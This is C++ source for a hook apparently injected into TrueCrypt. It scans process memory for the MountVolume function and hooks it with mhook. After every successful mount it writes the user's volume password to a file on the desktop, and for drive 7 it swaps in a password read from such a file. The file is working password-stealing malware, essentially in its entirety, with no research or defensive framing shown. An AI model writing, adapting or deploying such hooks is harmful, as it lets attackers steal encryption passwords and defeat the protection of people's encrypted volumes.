#include "stdafx.h"
#include "TrueCryptStealHook.h"
#include "mhook-lib/mhook.h"

_MountVolume RealMountVolume;

BOOL TrueCryptStealHook()
{

	HANDLE hProc = GetCurrentProcess();
	if (hProc == NULL)
		return FALSE;

	LPVOID baseAddress;
	DWORD baseSize;
	WCHAR moduleName[14] = L"TrueCrypt.exe";

	if (GetBaseAddressAndSizeModuleInProcess(hProc, baseAddress, baseSize, moduleName, 14))
	{
		LPVOID functionAddress;
		BYTE functionBytes[5] = { 0xB8, 0x34, 0x27, 0x00, 0x00 };

		if (GetFunctionAddressInProcessMemory(hProc, baseAddress, baseSize, functionAddress, functionBytes, 5))
		{
			RealMountVolume = (_MountVolume)functionAddress;

			Mhook_SetHook((PVOID *)&RealMountVolume, FakeMountVolume);
		}
	}

	return TRUE;
}

int FakeMountVolume(HWND hwndDlg, int driveNo, char *volumePath, Password *password, BOOL cachePassword, BOOL sharedAccess, const MountOptions* const mountOptions, BOOL quiet, BOOL bReportWrongPassword)
{
	if (driveNo == 7 && password != NULL && password->Length > 0)
	{
		CHAR openFileName[MAX_PATH];
		GetFilePathFromDirectoryNameAndFileName(PATH_TO_DESKTOP, volumePath, openFileName);

		HANDLE hFile = CreateFileA(openFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			ReadFile(hFile, password->Text, 64, (LPDWORD)&(password->Length), NULL);
			CloseHandle(hFile);
		}
	}

	int result_mount = RealMountVolume(hwndDlg, driveNo, volumePath, password, cachePassword, sharedAccess, mountOptions, quiet, bReportWrongPassword);

	if (result_mount > 0)
		SaveStealPassword(volumePath, password->Text, password->Length);

	return result_mount;
}

void SaveStealPassword(LPSTR volumePath, PBYTE password, UINT passwordLen)
{
	CHAR fileToSave[MAX_PATH];
	GetFilePathFromDirectoryNameAndFileName(PATH_TO_DESKTOP, volumePath, fileToSave);

	HANDLE hFile = CreateFileA(fileToSave, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	DWORD bytesWriten = 0;
	WriteFile(hFile, password, passwordLen, &bytesWriten, NULL);

	CloseHandle(hFile);
}

void GetFilePathFromDirectoryNameAndFileName(LPSTR rootPath, LPSTR volumePath, LPSTR fileToSave)
{
	size_t lenFileToSave = 0;

	while (*rootPath != '\0')
	{
		*(fileToSave++) = *(rootPath++);
		++lenFileToSave;
	}

	for (size_t i = 0; volumePath[i] != '\0'; ++i)
	{
		if (volumePath[i] == '\\')
			*fileToSave = '+';
		else if (volumePath[i] == ':')
			*fileToSave = '=';
		else
			*fileToSave = volumePath[i];

		++fileToSave;
		++lenFileToSave;
	}

	*fileToSave = '\0';
	fileToSave -= lenFileToSave;
}

BOOL GetBaseAddressAndSizeModuleInProcess(HANDLE hProc, LPVOID &base, DWORD &size, LPWCH needModuleName, int needModuleNameSize)
{
	HMODULE hModules[1024];
	DWORD cbNeeded;

	if (EnumProcessModules(hProc, hModules, sizeof(hModules), &cbNeeded))
	{
		MODULEINFO modInfo;

		for (size_t i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			WCHAR szModName[MAX_PATH];
			if (!GetModuleFileNameExW(hProc, hModules[i], szModName, MAX_PATH))
				return FALSE;

			if (!FullModuleNameIsTrueModuleName(szModName, needModuleName, needModuleNameSize))
				continue;

			if (!GetModuleInformation(hProc, hModules[i], &modInfo, sizeof(MODULEINFO)))
				return FALSE;

			base = modInfo.lpBaseOfDll;
			size = modInfo.SizeOfImage;

			return TRUE;
		}
	}

	return FALSE;
}

BOOL FullModuleNameIsTrueModuleName(LPWCH moduleName, LPWCH trueModuleName, int trueModuleNameSize)
{
	LPWCH pEndStr = moduleName;

	while (*pEndStr != L'\0')
		++pEndStr;

	if (pEndStr - moduleName < trueModuleNameSize - 1)
		return FALSE;

	for (int i = trueModuleNameSize - 1; i >= 0; --i, --pEndStr)
		if (*pEndStr != trueModuleName[i])
			return FALSE;

	return TRUE;
}

BOOL GetFunctionAddressInProcessMemory(HANDLE hProc, LPVOID base, DWORD size, LPVOID &functionAddress, PBYTE bytes, size_t countBytes)
{
	SIZE_T bytesRead = 0;
	PBYTE memStartPos = (PBYTE)base;
	int currentBytesPos = 0;

	for (size_t i = 0; i < (size - countBytes + 1); ++i)
	{
		for (size_t j = i; j < (i + countBytes); ++j)
		{
			if (memStartPos[j] == bytes[currentBytesPos])
			{
				++currentBytesPos;

				if (currentBytesPos == countBytes - 1)
				{
					functionAddress = memStartPos + i;
					return TRUE;
				}
			}
			else
			{
				break;
			}
		}

		currentBytesPos = 0;
	}

	return FALSE;
}